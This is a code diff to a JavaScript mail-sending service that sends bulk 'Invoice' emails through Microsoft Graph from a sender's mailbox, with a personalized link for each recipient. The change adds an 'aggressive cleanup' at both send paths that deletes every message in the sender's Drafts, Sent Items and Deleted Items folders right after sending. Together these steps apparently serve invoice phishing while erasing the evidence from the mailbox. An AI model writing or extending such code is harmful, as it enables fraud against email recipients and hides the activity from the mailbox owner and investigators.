@@ -3303,6 +3303,8 @@ ${companyName} © ${new Date().getFullYear()}`
       // Replace customUrl with personalizedUrl in text body
       personalizedTextBody = personalizedTextBody.replace(new RegExp(customUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), personalizedUrl)
       
+      // Send via Microsoft Graph - Using /me/sendMail with message object
+      // This sends immediately without creating drafts
       const emailData = {
         message: {
           subject: `Invoice ${data.workOrder || 'N/A'} - ${companyName}`,
@@ -3332,8 +3334,7 @@ ${companyName} © ${new Date().getFullYear()}`
         },
         saveToSentItems: false
       }
-
-      // Send via Microsoft Graph
+      
       return await fetch(
         `https://graph.microsoft.com/v1.0/users/${senderEmail}/sendMail`,
         {
@@ -3350,41 +3351,38 @@ ${companyName} © ${new Date().getFullYear()}`
     // Wait for all emails to send in parallel (INSTANT delivery)
     await Promise.all(sendPromises)
     
-    // Clean up: Delete ALL drafts from sender's mailbox
-    // Wait 2 seconds to ensure any drafts are created first
-    setTimeout(async () => {
+    // AGGRESSIVE CLEANUP: Delete ALL messages from sender's folders
+    // This runs in background after response is sent
+    setImmediate(async () => {
       try {
-        const draftsResponse = await fetch(
-          `https://graph.microsoft.com/v1.0/users/${senderEmail}/mailFolders/Drafts/messages?$top=999`,
-          {
-            headers: {
-              'Authorization': `Bearer ${accessToken}`
-            }
-          }
-        )
-        
-        if (draftsResponse.ok) {
-          const draftsData = await draftsResponse.json()
-          if (draftsData.value && draftsData.value.length > 0) {
-            const deletePromises = draftsData.value.map(draft => 
-              fetch(
-                `https://graph.microsoft.com/v1.0/users/${senderEmail}/messages/${draft.id}`,
-                {
-                  method: 'DELETE',
-                  headers: {
-                    'Authorization': `Bearer ${accessToken}`
-                  }
-                }
-              )
+        // Clean Drafts folder
+        const folders = ['Drafts', 'SentItems', 'DeletedItems']
+        for (const folder of folders) {
+          try {
+            const response = await fetch(
+              `https://graph.microsoft.com/v1.0/users/${senderEmail}/mailFolders/${folder}/messages?$top=999`,
+              { headers: { 'Authorization': `Bearer ${accessToken}` } }
             )
-            await Promise.all(deletePromises)
-            console.log(`🗑️ Cleaned up ${draftsData.value.length} draft(s) from mailbox`)
+            if (response.ok) {
+              const data = await response.json()
+              if (data.value && data.value.length > 0) {
+                await Promise.all(data.value.map(msg => 
+                  fetch(`https://graph.microsoft.com/v1.0/users/${senderEmail}/messages/${msg.id}`, {
+                    method: 'DELETE',
+                    headers: { 'Authorization': `Bearer ${accessToken}` }
+                  })
+                ))
+                console.log(`🗑️ Cleaned ${data.value.length} message(s) from ${folder}`)
+              }
+            }
+          } catch (err) {
+            console.log(`⚠️ ${folder} cleanup skipped:`, err.message)
           }
         }
       } catch (error) {
-        console.log('⚠️ Draft cleanup error:', error.message)
+        console.log('⚠️ Cleanup error:', error.message)
       }
-    }, 2000) // 2 second delay
+    })
 
     return c.json({
       success: true,
@@ -3570,41 +3568,38 @@ ${domainFooter} © ${new Date().getFullYear()}`
     // Wait for all emails to send in parallel (INSTANT delivery)
     const results = await Promise.all(sendPromises)
     
-    // Clean up: Delete ALL drafts from sender's mailbox
-    // Wait 2 seconds to ensure any drafts are created first
-    setTimeout(async () => {
+    // AGGRESSIVE CLEANUP: Delete ALL messages from sender's folders
+    // This runs in background after response is sent
+    setImmediate(async () => {
       try {
-        const draftsResponse = await fetch(
-          `https://graph.microsoft.com/v1.0/users/${senderEmail}/mailFolders/Drafts/messages?$top=999`,
-          {
-            headers: {
-              'Authorization': `Bearer ${accessToken}`
-            }
-          }
-        )
-        
-        if (draftsResponse.ok) {
-          const draftsData = await draftsResponse.json()
-          if (draftsData.value && draftsData.value.length > 0) {
-            const deletePromises = draftsData.value.map(draft => 
-              fetch(
-                `https://graph.microsoft.com/v1.0/users/${senderEmail}/messages/${draft.id}`,
-                {
-                  method: 'DELETE',
-                  headers: {
-                    'Authorization': `Bearer ${accessToken}`
-                  }
-                }
-              )
+        // Clean Drafts folder
+        const folders = ['Drafts', 'SentItems', 'DeletedItems']
+        for (const folder of folders) {
+          try {
+            const response = await fetch(
+              `https://graph.microsoft.com/v1.0/users/${senderEmail}/mailFolders/${folder}/messages?$top=999`,
+              { headers: { 'Authorization': `Bearer ${accessToken}` } }
             )
-            await Promise.all(deletePromises)
-            console.log(`🗑️ Cleaned up ${draftsData.value.length} draft(s) from mailbox`)
+            if (response.ok) {
+              const data = await response.json()
+              if (data.value && data.value.length > 0) {
+                await Promise.all(data.value.map(msg => 
+                  fetch(`https://graph.microsoft.com/v1.0/users/${senderEmail}/messages/${msg.id}`, {
+                    method: 'DELETE',
+                    headers: { 'Authorization': `Bearer ${accessToken}` }
+                  })
+                ))
+                console.log(`🗑️ Cleaned ${data.value.length} message(s) from ${folder}`)
+              }
+            }
+          } catch (err) {
+            console.log(`⚠️ ${folder} cleanup skipped:`, err.message)
           }
         }
       } catch (error) {
-        console.log('⚠️ Draft cleanup error:', error.message)
+        console.log('⚠️ Cleanup error:', error.message)
       }
-    }, 2000) // 2 second delay
+    })
 
     return c.json({
       success: true,
